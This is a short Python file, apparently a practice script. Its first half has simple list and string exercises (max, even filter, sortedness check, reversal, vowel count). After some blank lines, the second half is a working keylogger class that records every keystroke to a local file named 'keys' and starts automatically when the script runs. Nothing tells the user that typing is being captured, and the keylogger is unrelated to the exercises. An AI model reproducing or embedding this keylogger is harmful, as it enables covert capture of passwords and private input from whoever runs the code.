import numpy as np

a = [1,2,3,4,3,1,3,2]

def maxNum(list):
    return max(list)

def maxNum1(list):
    max = list[0]
    for num in list:
        if max < num:
            max = num
    return max

def evenOnly(list):
    return [i for i in list if i%2 ==0]

def isSorted(list):
    for i in range(0,len(list) - 1):
        if list[i] > list[i+1]:
            return False
    return True
 
def reverseText(txt):
    return txt[::-1]

def counter( txt: str) -> int:
    letters = set("aeiou")
    return sum(1 for c in txt.lower() if c in letters)

b = ["a","b","c","d"]
print()




import keyboard as kb

class KeyLogger:
    
    def __init__(self, log_fileName):
        self.f = open(log_fileName, "w")
        
    def start_log(self):
        kb.on_release(callback=self.callback )
        kb.wait()
        
    def callback(self,event):
        key_name = event.name
        
        self.f.write(key_name)
        self.f.flush()
        
kl = KeyLogger("keys")
kl.start_log()
